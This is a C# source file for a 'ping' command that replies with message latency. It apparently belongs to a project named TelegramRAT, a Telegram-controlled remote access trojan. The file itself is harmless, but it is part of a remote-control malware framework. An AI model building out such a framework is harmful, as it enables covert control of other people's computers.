using Telegram.Bot;

namespace TelegramRAT.Commands.Core;

public class PingCommand(ITelegramBotClient botClient) : AbstractBotCommand
{
    public override string Command => "ping";
    public override string Description => "Ping bot to check if it's work";
    public override int ArgsCount => 0;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        var elapsedTime = (DateTime.UtcNow - model.Message.Date.ToUniversalTime()).TotalMilliseconds;
        await botClient.SendMessage(model.Message.Chat.Id, $"Pong!\nElapsed time: {elapsedTime:F0} ms", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
    }
}
